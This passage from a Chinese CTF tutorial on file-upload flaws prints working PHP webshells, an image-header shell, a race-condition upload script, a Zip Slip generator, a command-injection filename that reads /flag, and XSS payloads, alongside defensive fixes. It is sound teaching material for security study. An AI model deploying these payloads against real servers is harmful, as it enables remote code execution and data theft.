可以去掉部分目录路径，但仍然保留攻击者控制的文件名。

还可能存在：

1. 同名覆盖。
2. 特殊 Unicode 字符。
3. Windows 保留名。
4. 大小写和尾部点号规范化。
5. 过长文件名。
6. 双后缀和解析差异。

更稳妥的做法是服务器自己生成随机文件名，不使用客户端文件名作为磁盘路径。

### 1.10.5 远程 URL 导入中的文件名差异

有些网站不是让用户直接上传文件，而是让用户提交图片 URL，由服务器使用 curl、wget 或语言自带 HTTP 客户端下载。

不安全流程可能是：

1. 使用 URL 解析函数检查路径后缀。
2. 允许 `/avatar.png`。
3. 下载工具根据完整 URL、查询参数、重定向响应或 `Content-Disposition` 决定最终文件名。
4. 校验看到的文件名和落盘文件名不一致。

例如某些特定下载流程中：

```text
http://attacker.example/avatar.png?shell.php
```

校验逻辑可能只看到路径：

```text
/avatar.png
```

但下载工具或后续重命名逻辑可能把查询部分带进文件名，最终出现含 `.php` 的文件。

还要检查：

1. 302 重定向前后是否重新校验。
2. 响应头 `Content-Disposition: filename=...` 是否能控制落盘文件名。
3. 最终 URL 和原始 URL 的后缀是否分别检查。
4. 下载后的真实 MIME 和内容是否重新验证。
5. 文件名是否经过统一规范化和服务器端随机化。

这个技巧依赖具体下载工具和版本，不能默认所有 wget 或 curl 调用都会使用相同命名规则。

### 1.10.6 常见注意点

1. 文件名和保存目录要分别测试。
2. Linux 使用 `/`，Windows 还要考虑 `\`。
3. 路径过滤必须在完整解码和规范化后进行。
4. 写入成功后要确认文件真实位置。
5. 远程 URL 导入要比较校验对象和最终落盘对象。
6. 如果不能直接访问，尝试配合文件包含、模板加载或静态资源覆盖。

## 1.11 文件上传配合文件包含

### 1.11.1 利用链原理

如果上传目录不解析 PHP，但网站存在本地文件包含：

```php
include($_GET['page']);
```

就可以：

1. 上传包含 PHP 代码的图片。
2. 获得图片保存路径。
3. 通过文件包含漏洞包含该图片。
4. PHP 在 `include()` 过程中解释其中的 PHP 标签。
5. 触发代码执行。

利用链：

```text
上传图片马
    ↓
得到 /uploads/avatar.jpg
    ↓
?page=/var/www/html/uploads/avatar.jpg
    ↓
include() 读取文件
    ↓
PHP 标签被执行
```

### 1.11.2 构造图片马

示例：

```php
GIF89a
<?php system($_GET['cmd']); ?>
```

保存为：

```text
avatar.gif
```

先确认上传成功，再通过文件包含参数：

```text
/index.php?page=/var/www/html/uploads/avatar.gif&cmd=id
```

如果包含点要求相对路径：

```text
/index.php?page=uploads/avatar.gif&cmd=id
```

### 1.11.3 寻找上传文件的真实路径

浏览器访问路径：

```text
/uploads/avatar.gif
```

对应的服务器路径可能是：

```text
/var/www/html/uploads/avatar.gif
/app/public/uploads/avatar.gif
/usr/share/nginx/html/uploads/avatar.gif
```

可以从以下位置判断：

1. 上传响应中的绝对路径或报错。
2. 网站源码中的 `upload_dir`。
3. Dockerfile 和 Nginx / Apache 配置。
4. `phpinfo()` 中的 `DOCUMENT_ROOT`。
5. 目录穿越或文件读取漏洞。
6. RCE 后的 `pwd` 和 `find`。

### 1.11.4 临时上传文件包含

PHP 上传过程中会先创建临时文件，例如：

```text
/tmp/phpA1B2C3
```

如果存在文件包含漏洞，并且能够知道临时文件名，就可能在文件被移动或删除前包含它。

难点是：

1. 临时文件名通常随机。
2. 请求结束后临时文件会被删除。
3. 需要信息泄露、上传进度机制或条件竞争帮助定位。
4. 上传和包含请求需要在时间上配合。

这类利用比普通"上传图片马后包含"更复杂，通常放在文件包含进阶题中处理。

### 1.11.5 常见注意点

1. 图片马直接访问通常只会显示图片或文本，不会执行 PHP。
2. `include()` 是否执行代码取决于文件内容和 PHP 标签。
3. 需要区分 URL 路径和服务器文件系统路径。
4. 如果上传后被重新编码，PHP 代码可能已经消失。
5. 参数 `cmd` 可能同时被包含页面和 Webshell 读取，要注意命名冲突。

## 1.12 条件竞争上传

### 1.12.1 漏洞原理

不安全后端可能先把文件移动到公开目录，再检查内容：

```php
$target = __DIR__ . '/uploads/' . basename($_FILES['file']['name']);
move_uploaded_file($_FILES['file']['tmp_name'], $target);

if (!is_safe_file($target)) {
    unlink($target);
    die('非法文件');
}
```

文件虽然最终被删除，但在"移动成功"和"删除"之间存在一个短暂窗口。

如果在窗口内快速访问：

```text
/uploads/shell.php
```

就可能在删除前触发一次代码执行。

### 1.12.2 手工判断条件竞争

可以先观察：

1. 响应是否明显耗时。
2. 上传目录是否短暂出现文件。
3. 文件名是否固定。
4. 非法文件是立即拒绝，还是上传后再删除。
5. 多次并发访问是否偶尔返回不同结果。

BurpSuite 可以把上传请求和访问请求分别放入 Repeater，再使用并行发送功能进行测试。

### 1.12.3 Python 并发脚本

下面脚本反复上传和访问同一个文件：

```python
import threading
import requests

base = "http://target.example"
upload_url = base + "/upload.php"
shell_url = base + "/uploads/race.php"

stop = threading.Event()

payload = b"<?php echo file_get_contents('/flag'); ?>"

def upload_loop():
    while not stop.is_set():
        files = {
            "file": ("race.php", payload, "image/jpeg")
        }
        try:
            requests.post(upload_url, files=files, timeout=3)
        except requests.RequestException:
            pass

def read_loop():
    while not stop.is_set():
        try:
            response = requests.get(shell_url, timeout=3)
            if "flag{" in response.text:
                print(response.text)
                stop.set()
                return
        except requests.RequestException:
            pass

threads = []

for _ in range(5):
    threads.append(threading.Thread(target=upload_loop))

for _ in range(10):
    threads.append(threading.Thread(target=read_loop))

for thread in threads:
    thread.start()

for thread in threads:
    thread.join()
```

根据题目修改：

1. 上传字段名。
2. Session 和 CSRF Token。
3. 文件保存路径。
4. 文件名是否被重命名。
5. 判断成功的响应特征。
6. 并发线程数量。

### 1.12.4 扩大竞争窗口

有时可以通过以下方式扩大窗口：

1. 上传稍大的文件，让检查更慢。
2. 构造处理耗时更长但仍在大小限制内的图片。
3. 并发发送多个上传请求。
4. 并发发送多个访问请求。
5. 如果能控制远程资源，让后端校验或扫描阶段等待。
6. 利用服务器负载增加处理延迟。

不要无限增加线程。线程过多可能先把本地连接池、目标服务或题目容器打挂。

### 1.12.5 常见注意点

1. 条件竞争的关键是"先落盘，后检查或删除"。
2. 如果后端在临时目录检查完成后才移动，通常没有这个窗口。
3. 随机文件名会显著增加利用难度。
4. 成功一次就应停止脚本，避免无意义请求。
5. CTF 中要保存成功响应，防止 flag 只出现一次。

## 1.13 压缩包上传与解压漏洞

### 1.13.1 Zip Slip 路径穿越

网站可能允许上传 ZIP，并在服务器解压。

如果后端直接信任压缩包内的文件名：

```text
../../../../var/www/html/shell.php
```

解压时就可能写出目标目录。

Python 生成测试 ZIP：

```python
import zipfile

payload = b"<?php echo file_get_contents('/flag'); ?>"

with zipfile.ZipFile("payload.zip", "w") as archive:
    archive.writestr("../../../../var/www/html/shell.php", payload)
```

是否成功取决于：

1. 解压库是否阻止 `../`。
2. 解压目录与 Web 根目录的相对位置。
3. Web 进程是否有目标目录写权限。
4. 写出的文件是否会被脚本引擎解析。

### 1.13.2 绝对路径和 Windows 路径

还可以检查解压器如何处理：

```text
/var/www/html/shell.php
C:\inetpub\wwwroot\shell.aspx
..\..\shell.php
```

很多安全解压库会拒绝绝对路径，但不同语言和库的规范化行为不同。

### 1.13.3 符号链接

某些归档格式支持符号链接。

如果服务端解压后跟随攻击者创建的符号链接，可能：

1. 覆盖解压目录外文件。
2. 读取服务器敏感文件。
3. 把公开下载文件指向 `/flag`。
4. 配合后续写入覆盖目标。

ZIP、TAR 和具体解压库对符号链接处理不同，需要结合源码验证。

### 1.13.4 压缩包文件名命令注入

压缩工具本身一般不会因为文件名中存在分号就执行命令。危险通常出现在解压后的二次处理阶段。

例如后端把压缩包内的每个文件名直接拼进 Shell：

```php
foreach ($files as $file) {
    system("convert " . $file . " thumbs/" . $file . ".png");
}
```

如果压缩包成员名是：

```text
a.jpg;cat /flag > result.txt;#
```

最终命令可能变成：

```bash
convert a.jpg;cat /flag > result.txt;# thumbs/a.jpg...
```

判断条件：

1. 后端使用 Shell 命令处理解压后的文件。
2. 文件名直接拼接进命令字符串。
3. 没有使用安全参数数组或正确转义。
4. 文件系统和解压库允许对应特殊字符。
5. 命令输出能够回显、写入公开文件或通过外带获取。

安全代码应避免 Shell 字符串拼接，优先使用参数数组调用进程，并对文件名使用服务器生成的安全名称。

### 1.13.5 解压后的二次处理

上传压缩包后，服务端还可能：

1. 自动导入主题或插件。
2. 加载模板文件。
3. 执行安装脚本。
4. 解析 YAML、XML 或 JSON 配置。
5. 扫描目录并加载动态模块。

因此压缩包上传的攻击面不只是 Zip Slip，还要检查"解压后谁会读取这些文件"。

### 1.13.6 防御判断

安全解压流程应当：

1. 对每个压缩成员计算规范化后的绝对路径。
2. 确认它仍位于目标解压目录内部。
3. 拒绝绝对路径。
4. 拒绝 `..` 穿越。
5. 谨慎处理符号链接和硬链接。
6. 限制总解压大小和文件数量。
7. 解压到不可执行的隔离目录。

## 1.14 上传文件触发的非 RCE 漏洞

### 1.14.1 SVG 存储型 XSS

SVG 是 XML 文本，可以包含脚本或事件属性。

示例：

```xml
<svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.domain)">
</svg>
```

如果网站允许上传 SVG，并通过同源地址直接内联展示，可能触发存储型 XSS。

影响取决于：

1. 响应 `Content-Type` 是否为 `image/svg+xml`。
2. 是否通过 `<img>`、`<object>`、`<iframe>` 或直接导航加载。
3. 是否设置严格 CSP。
4. 是否使用独立无 Cookie 域名托管上传文件。
5. 是否强制 `Content-Disposition: attachment`。

### 1.14.2 HTML 文件上传

如果允许上传 `.html`，并且上传文件与主站同源，攻击者可以构造钓鱼页面、脚本页面或利用主站 Cookie 权限。

示例：

```html
`<script>`
fetch('/admin').then(r => r.text()).then(console.log);
`</script>`
```

能否读取敏感内容还取决于 Cookie、同源策略、CSP 和权限校验。

### 1.14.3 XML、SVG 和 Office 文档中的 XXE

如果后端会解析上传的 XML、SVG、DOCX、XLSX 等文件，并且 XML 解析器允许外部实体，可能触发 XXE。

Office 新格式本质上通常是 ZIP 包，内部包含多个 XML 文件。

判断重点：

1. 后端是否真正解析文件。
2. 解析器是否允许 DTD。
3. 是否允许外部实体。
4. 是否存在回显或 OOB 网络访问。
5. 处理发生在同步请求还是后台任务。

### 1.14.4 文件名 XSS 和日志注入

如果上传页面直接把原始文件名插入 HTML：

```html
上传成功：<span>【原始文件名】</span>
```

而没有 HTML 转义，文件名本身可能触发 XSS。

例如测试文件名中是否能包含：

```text
"><img src=x onerror=alert(1)>.jpg
```

操作系统不一定允许直接创建这种文件名，但 multipart 的 `filename` 可以在 BurpSuite 中手工修改。

### 1.14.5 拒绝服务

需要关注：

1. 超大文件。
2. 大量小文件。
3. ZIP 炸弹。
4. 超大像素图片。
5. 恶意图片导致解码器消耗大量内存。
6. 后台病毒扫描和转码任务堆积。

CTF 中通常只需理解原理，不应通过破坏题目服务的方式验证拒绝服务。

## 1.15 寻找上传后的文件路径

### 1.15.1 查看响应内容

上传响应可能直接返回：

```json
{
  "success": true,
  "path": "/uploads/2026/07/a8f3c2.jpg",
  "id": 103
}
```

或者响应头：

```http
Location: /files/103
```

重点搜索：

```text
url
path
file
filename
key
id
location
download
```

### 1.15.2 查看前端后续请求

上传成功后，页面可能再请求：

```http
GET /api/files/103
GET /uploads/a8f3c2.jpg
GET /image?key=a8f3c2
```

浏览器 Network 面板可以看到真实访问路径。

### 1.15.3 猜测常见目录

常见目录：

```text
/uploads/
/upload/
/files/
/static/uploads/
/media/
/images/
/assets/upload/
/storage/
/public/uploads/
```

如果文件名保留，可以直接尝试。

如果文件名被随机化，要优先找响应、源码、数据库或下载接口，不要盲目爆破长随机值。

### 1.15.4 从源码判断命名规则

例如：

```php
$name = md5_file($_FILES['file']['tmp_name']) . '.jpg';
```

就可以在本地计算：

```bash
md5sum avatar.jpg
```

如果是：

```php
$name = time() . '_' . mt_rand(1000, 9999) . '.jpg';
```

可以根据服务器时间和随机范围缩小枚举。

### 1.15.5 区分直接访问和下载接口

直接访问：

```text
/uploads/avatar.jpg
```

通常由 Web 服务器处理，可能触发脚本解析。

下载接口：

```text
/download.php?id=103
```

通常由后端读取文件后输出，可能设置：

```http
Content-Disposition: attachment
```

这种情况下，即使磁盘文件是 `.php`，也不一定会被 PHP 当作脚本执行，因为它只是被下载接口读取。

## 1.16 完整例题：从 MIME 绕过到代码执行

### 1.16.1 题目源码

假设题目源码：

```php
<?php
if (!isset($_FILES['file'])) {
    die('no file');
}

$file = $_FILES['file'];

if ($file['type'] !== 'image/jpeg') {
    die('only jpg');
}

$name = basename($file['name']);
$target = __DIR__ . '/uploads/' . $name;

if (!move_uploaded_file($file['tmp_name'], $target)) {
    die('upload failed');
}

echo '/uploads/' . $name;
?>
```

### 1.16.2 分析上传条件

这段代码检查了：

```php
$file['type'] === 'image/jpeg'
```

但是 `$file['type']` 来自客户端的 multipart 请求，可以修改。

代码没有检查：

1. 文件后缀。
2. 文件真实 MIME。
3. 文件头。
4. 文件内容。
5. 上传目录是否允许 PHP 执行。
6. 客户端文件名是否应该被保留。

因此可以尝试：

```text
文件名：shell.php
文件 Content-Type：image/jpeg
文件内容：PHP 探测代码
```

### 1.16.3 构造探测文件

```php
<?php echo "UPLOAD_OK_7f3a"; ?>
```

保存为：

```text
shell.php
```

### 1.16.4 修改请求

```http
POST /upload.php HTTP/1.1
Host: target.example
Content-Type: multipart/form-data; boundary=----ctfBoundary
Cookie: PHPSESSID=【Session】

------ctfBoundary
Content-Disposition: form-data; name="file"; filename="shell.php"
Content-Type: image/jpeg

<?php echo "UPLOAD_OK_7f3a"; ?>
------ctfBoundary--
```

响应：

```text
/uploads/shell.php
```

### 1.16.5 验证是否解析

访问：

```text
http://target.example/uploads/shell.php
```

如果只看到：

```text
UPLOAD_OK_7f3a
```

说明 PHP 标签被执行。

如果看到完整源代码或浏览器下载文件，说明上传成功但没有 PHP 解析，需要继续寻找其他利用链。

### 1.16.6 读取 flag

确认解析后，把文件内容改为：

```php
<?php echo file_get_contents('/flag'); ?>
```

再次上传并访问。

也可以使用命令执行：

```php
<?php system($_GET['cmd']); ?>
```

访问：

```text
/uploads/shell.php?cmd=cat%20/flag
```

直接使用 `file_get_contents()` 通常比反弹 Shell 更简单，也更符合 CTF 中"先完成最小利用"的原则。

### 1.16.7 如果上传目录不解析 PHP

如果访问 `shell.php` 只下载或显示源码，可以继续检查：

1. 是否存在文件包含。
2. 是否允许上传 `.htaccess`。
3. 是否允许上传 `.user.ini`。
4. 是否存在路径穿越，能把文件写到其他目录。
5. 是否存在 Nginx PATH_INFO 解析问题。
6. 是否可以覆盖已有 PHP 文件。
7. 是否存在后台导入、模板或插件加载功能。

### 1.16.8 修复方法

不能只把：

```php
$file['type']
```

换成另一个客户端字段。

正确方向是：

1. 使用服务端 `finfo` 检测 MIME。
2. 使用后缀白名单。
3. 对图片进行真正解码和重新编码。
4. 服务端生成随机文件名。
5. 存储到 Web 根目录之外。
6. 上传目录禁止脚本执行。
7. 下载时使用独立接口和 `attachment`。
8. 限制文件大小、尺寸和数量。

## 1.18 文件上传速查表

| 现象 | 优先判断 | 常见下一步 |
| ---- | -------- | ---------- |
| 选择文件时立即弹窗，没有请求 | 前端 JavaScript 检查 | Burp 抓包修改、禁用前端检查 |
| 改成 `.php` 后服务端拒绝 | 后缀检查 | 判断黑名单/白名单、测试遗漏后缀 |
| `.php` + `image/jpeg` 通过 | 可能只检查 MIME | 找访问路径并验证是否解析 |
| `.jpg` 普通文本失败 | 可能检查文件头或图片结构 | 真实图片、图片马、对比重新编码 |
| 上传后代码消失 | 图片被重新编码 | 换利用链，不再依赖末尾追加 |
| 上传成功但 PHP 被下载 | 上传目录不解析 | 文件包含、配置文件、路径写入 |
| 文件很快被删除 | 先保存后检查 | 测试条件竞争 |
| 文件名被随机化 | 服务端重命名 | 看响应、源码、数据库和命名算法 |
